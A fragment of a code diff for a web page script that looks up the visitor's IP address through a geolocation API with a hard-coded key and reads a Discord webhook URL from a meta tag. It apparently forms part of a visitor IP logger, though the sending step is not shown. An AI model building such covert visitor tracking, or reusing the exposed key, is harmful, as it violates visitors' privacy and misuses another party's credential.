@@ -17,7 +17,7 @@
     // use the 'fetch' API to retrieve the user's IP address
       $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
         // display the IP address on the page
-        const ip = data.ip
+        const ip = data.ip_address
 
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
